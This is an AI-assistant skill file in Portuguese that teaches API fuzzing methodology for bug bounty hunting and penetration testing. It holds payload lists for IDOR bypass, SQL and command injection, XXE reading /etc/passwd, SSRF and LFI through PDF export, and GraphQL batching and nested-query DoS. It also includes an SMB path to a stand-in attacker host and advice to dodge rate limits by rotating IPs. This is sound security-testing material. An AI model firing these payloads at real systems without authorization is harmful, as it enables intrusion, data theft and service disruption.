---
name: API Fuzzing for Bug Bounty
description: Esta habilidade deve ser usada quando o usuário solicita "testar segurança de API", "fazer fuzzing em APIs", "encontrar vulnerabilidades IDOR", "testar REST API", "testar GraphQL", "testes de penetração em API", "testes de API para bug bounty", ou precisa de orientação sobre técnicas de avaliação de segurança de API.
metadata:
  author: zebbern
  version: "1.1"
---

# API Fuzzing for Bug Bounty

## Propósito

Fornecer técnicas abrangentes para testar APIs REST, SOAP e GraphQL durante caçadas de bug bounty e engajamentos de teste de penetração. Cobre descoberta de vulnerabilidades, bypass de autenticação, exploração de IDOR e vetores de ataque específicos de API.

## Inputs/Pré-requisitos

- Burp Suite ou ferramenta de proxy similar
- Wordlists de API (SecLists, api_wordlist)
- Compreensão dos protocolos REST/GraphQL/SOAP
- Python para scripting
- Endpoints de API de destino e documentação (se disponível)

## Outputs/Entregas

- Vulnerabilidades de API identificadas
- Provas de exploração de IDOR
- Técnicas de bypass de autenticação
- Pontos de SQL injection
- Documentação de acesso a dados não autorizado

---

## Visão Geral dos Tipos de API

| Tipo | Protocolo | Formato de Dados | Estrutura |
|------|-----------|------------------|-----------|
| SOAP | HTTP | XML | Header + Body |
| REST | HTTP | JSON/XML/URL | Endpoints definidos |
| GraphQL | HTTP | Custom Query | Endpoint único |

---

## Fluxo de Trabalho Principal

### Etapa 1: Reconhecimento de API

Identifique o tipo de API e enumere endpoints:

```bash
# Verifique documentação Swagger/OpenAPI
/swagger.json
/openapi.json
/api-docs
/v1/api-docs
/swagger-ui.html

# Use Kiterunner para descoberta de API
kr scan https://target.com -w routes-large.kite

# Extraia paths do Swagger
python3 json2paths.py swagger.json
```

### Etapa 2: Teste de Autenticação

```bash
# Teste diferentes caminhos de login
/api/mobile/login
/api/v3/login
/api/magic_link
/api/admin/login

# Verifique rate limiting em endpoints de autenticação
# Se sem rate limit → brute force possível

# Teste API mobile vs web separadamente
# Não assuma mesmos controles de segurança
```

### Etapa 3: Teste de IDOR

Insecure Direct Object Reference é a vulnerabilidade de API mais comum:

```bash
# IDOR básico
GET /api/users/1234 → GET /api/users/1235

# Mesmo se ID for baseado em email, teste numérico
/?user_id=111 em vez de /?user_id=user@mail.com

# Teste /me/orders vs /user/654321/orders
```

**Técnicas de Bypass de IDOR:**

```bash
# Encapsule ID em array
{"id":111} → {"id":[111]}

# JSON wrap
{"id":111} → {"id":{"id":111}}

# Envie ID duas vezes
URL?id=<LEGIT>&id=<VICTIM>

# Injeção de wildcard
{"user_id":"*"}

# Poluição de parâmetros
/api/get_profile?user_id=<victim>&user_id=<legit>
{"user_id":<legit_id>,"user_id":<victim_id>}
```

### Etapa 4: Teste de Injeção

**SQL Injection em JSON:**

```json
{"id":"56456"}                    → OK
{"id":"56456 AND 1=1#"}           → OK  
{"id":"56456 AND 1=2#"}           → OK
{"id":"56456 AND 1=3#"}           → ERROR (vulnerável!)
{"id":"56456 AND sleep(15)#"}     → SLEEP 15 SEC
```

**Command Injection:**

```bash
# Ruby on Rails
?url=Kernel#open → ?url=|ls

# Injeção de comando Linux
api.url.com/endpoint?name=file.txt;ls%20/
```

**XXE Injection:**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

**SSRF via API:**

```html
<object data="http://127.0.0.1:8443"/>
<img src="http://127.0.0.1:445"/>
```

**Vulnerabilidade .NET Path.Combine:**

```bash
# Se app .NET usa Path.Combine(path_1, path_2)
# Teste path traversal
https://example.org/download?filename=a.png
https://example.org/download?filename=C:\inetpub\wwwroot\web.config
https://example.org/download?filename=\\smb.dns.attacker.com\a.png
```

### Etapa 5: Teste de Métodos

```bash
# Teste todos os métodos HTTP
GET /api/v1/users/1
POST /api/v1/users/1
PUT /api/v1/users/1
DELETE /api/v1/users/1
PATCH /api/v1/users/1

# Alterne content type
Content-Type: application/json → application/xml
```

---

## Testes Específicos para GraphQL

### Query de Introspection

Busque todo o schema do backend:

```graphql
{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}
```

**Versão URL-encoded:**

```
/graphql?query={__schema{types{name,kind,description,fields{name}}}}
```

### IDOR em GraphQL

```graphql
# Tente acessar IDs de outros usuários
query {
  user(id: "OTHER_USER_ID") {
    email
    password
    creditCard
  }
}
```

### SQL/NoSQL Injection em GraphQL

```graphql
mutation {
  login(input: {
    email: "test' or 1=1--"
    password: "password"
  }) {
    success
    jwt
  }
}
```

### Bypass de Rate Limit (Batching)

```graphql
mutation {login(input:{email:"a@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"b@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"c@example.com" password:"password"}){success jwt}}
```

### DoS em GraphQL (Nested Queries)

```graphql
query {
  posts {
    comments {
      user {
        posts {
          comments {
            user {
              posts { ... }
            }
          }
        }
      }
    }
  }
}
```

### XSS em GraphQL

```bash
# XSS via endpoint GraphQL
http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}

# XSS URL-encoded
http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
```

### Ferramentas GraphQL

| Ferramenta | Propósito |
|-----------|-----------|
| GraphCrawler | Descoberta de schema |
| graphw00f | Fingerprinting |
| clairvoyance | Reconstrução de schema |
| InQL | Extensão do Burp |
| GraphQLmap | Exploração |

---

## Técnicas de Bypass de Endpoint

Ao receber 403/401, tente estes bypasses:

```bash
# Requisição bloqueada original
/api/v1/users/sensitivedata → 403

# Tentativas de bypass
/api/v1/users/sensitivedata.json
/api/v1/users/sensitivedata?
/api/v1/users/sensitivedata/
/api/v1/users/sensitivedata??
/api/v1/users/sensitivedata%20
/api/v1/users/sensitivedata%09
/api/v1/users/sensitivedata#
/api/v1/users/sensitivedata&details
/api/v1/users/..;/sensitivedata
```

---

## Exploração de Output

### Ataques via Exportação PDF

```html
<!-- LFI via exportação PDF -->
<iframe src="file:///etc/passwd" height=1000 width=800>

<!-- SSRF via exportação PDF -->
<object data="http://127.0.0.1:8443"/>

<!-- Port scanning -->
<img src="http://127.0.0.1:445"/>

<!-- Revelação de IP -->
<img src="https://iplogger.com/yourcode.gif"/>
```

### DoS via Limites

```bash
# Requisição normal
/api/news?limit=100

# Tentativa de DoS
/api/news?limit=9999999999
```

---

## Checklist de Vulnerabilidades Comuns de API

| Vulnerabilidade | Descrição |
|-----------------|-----------|
| API Exposure | Endpoints desprotegidos expostos publicamente |
| Caching Misconfigured | Dados sensíveis em cache incorretamente |
| Tokens Expostos | Chaves de API/tokens em respostas ou URLs |
| Fraquezas JWT | Assinatura fraca, sem expiração, confusão de algoritmo |
| IDOR / BOLA | Broken Object Level Authorization |
| Endpoints Não Documentados | Endpoints ocultos admin/debug |
| Diferentes Versões | Lacunas de segurança em versões antigas de API |
| Rate Limiting | Rate limit ausente ou contornável |
| Race Conditions | Vulnerabilidades TOCTOU |
| XXE Injection | Exploração de parser XML |
| Problemas de Content Type | Alternância entre JSON/XML |
| HTTP Method Tampering | Abuso GET→DELETE/PUT |

---

## Referência Rápida

| Vulnerabilidade | Payload de Teste | Risco |
|-----------------|-----------------|-------|
| IDOR | Alterar parâmetro user_id | Alto |
| SQLi | `' OR 1=1--` em JSON | Crítico |
| Command Injection | `; ls /` | Crítico |
| XXE | DOCTYPE com ENTITY | Alto |
| SSRF | IP interno em params | Alto |
| Rate Limit Bypass | Requisições em batch | Médio |
| Method Tampering | GET→DELETE | Alto |

---

## Referência de Ferramentas

| Categoria | Ferramenta | URL |
|-----------|-----------|-----|
| API Fuzzing | Fuzzapi | github.com/Fuzzapi/fuzzapi |
| API Fuzzing | API-fuzzer | github.com/Fuzzapi/API-fuzzer |
| API Fuzzing | Astra | github.com/flipkart-incubator/Astra |
| API Security | apicheck | github.com/BBVA/apicheck |
| API Discovery | Kiterunner | github.com/assetnote/kiterunner |
| API Discovery | openapi_security_scanner | github.com/ngalongc/openapi_security_scanner |
| API Toolkit | APIKit | github.com/API-Security/APIKit |
| API Keys | API Guesser | api-guesser.netlify.app |
| GUID | GUID Guesser | gist.github.com/DanaEpp/8c6803e542f094da5c4079622f9b4d18 |
| GraphQL | InQL | github.com/doyensec/inql |
| GraphQL | GraphCrawler | github.com/gsmith257-cyber/GraphCrawler |
| GraphQL | graphw00f | github.com/dolevf/graphw00f |
| GraphQL | clairvoyance | github.com/nikitastupin/clairvoyance |
| GraphQL | batchql | github.com/assetnote/batchql |
| GraphQL | graphql-cop | github.com/dolevf/graphql-cop |
| Wordlists | SecLists | github.com/danielmiessler/SecLists |
| Swagger Parser | Swagger-EZ | rhinosecuritylabs.github.io/Swagger-EZ |
| Swagger Routes | swagroutes | github.com/amalmurali47/swagroutes |
| API Mindmap | MindAPI | dsopas.github.io/MindAPI/play |
| JSON Paths | json2paths | github.com/s0md3v/dump/tree/master/json2paths |

---

## Restrições

**Deve:**
- Testar APIs mobile, web e developer separadamente
- Verificar todas as versões de API (/v1, /v2, /v3)
- Validar acesso autenticado e não autenticado

**Não Deve:**
- Assumir mesmos controles de segurança entre versões de API
- Pular testes de endpoints não documentados
- Ignorar verificações de rate limiting

**Deveria:**
- Adicionar header `X-Requested-With: XMLHttpRequest` para simular frontend
- Verificar archive.org para endpoints históricos de API
- Testar race conditions em operações sensíveis

---

## Exemplos

### Exemplo 1: Exploração de IDOR

```bash
# Requisição original (dados próprios)
GET /api/v1/invoices/12345
Authorization: Bearer <token>

# Requisição modificada (dados de outro usuário)
GET /api/v1/invoices/12346
Authorization: Bearer <token>

# Resposta revela dados de invoice de outro usuário
```

### Exemplo 2: Introspection GraphQL

```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}'
```

---

## Troubleshooting

| Problema | Solução |
|----------|---------|
| API retorna nada | Adicione header `X-Requested-With: XMLHttpRequest` |
| 401 em todos os endpoints | Tente adicionar parâmetro `?user_id=1` |
| Introspection GraphQL desabilitado | Use clairvoyance para reconstruir schema |
| Rate limited | Use rotação de IP ou requisições em batch |
| Não consegue encontrar endpoints | Verifique Swagger, archive.org, arquivos JS |